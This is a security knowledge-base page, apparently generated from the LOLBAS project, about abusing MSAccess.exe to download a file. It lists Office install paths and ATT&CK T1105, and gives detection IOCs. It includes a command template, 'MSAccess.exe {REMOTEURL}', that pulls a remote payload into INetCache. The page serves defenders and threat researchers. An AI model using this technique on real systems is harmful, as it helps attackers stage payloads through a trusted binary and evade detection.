---
title: "MSAccess.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Msaccess.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msaccess.yml"
build_date: "2026-04-27 18:39:01"
category: "OtherMSBinaries"
aliases:
  - "MSAccess.exe"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# MSAccess.exe

Microsoft Office component

## Metadata

- Category: OtherMSBinaries
- Created: 2023-04-30
- Author: Nir Chako
- Source Path: yml/OtherMSBinaries/Msaccess.yml

## Paths

- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSAccess.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\MSAccess.exe`
- `C:\Program Files\Microsoft Office\Office16\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSAccess.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\MSAccess.exe`
- `C:\Program Files\Microsoft Office\Office15\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSAccess.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\MSAccess.exe`
- `C:\Program Files\Microsoft Office\Office14\MSAccess.exe`
- `C:\Program Files (x86)\Microsoft Office\Office12\MSAccess.exe`
- `C:\Program Files\Microsoft Office\Office12\MSAccess.exe`

## Commands

### 1. Download

Downloads payload from remote server

```cmd
MSAccess.exe {REMOTEURL}
```

- Use Case: It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Detections

- IOC: URL on a MSAccess command line
- IOC: MSAccess making unexpected network connections or DNS requests

## Acknowledgements

- {'Person': 'Nir Chako', 'Handle': '@C_h4ck_0'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msaccess.yml)
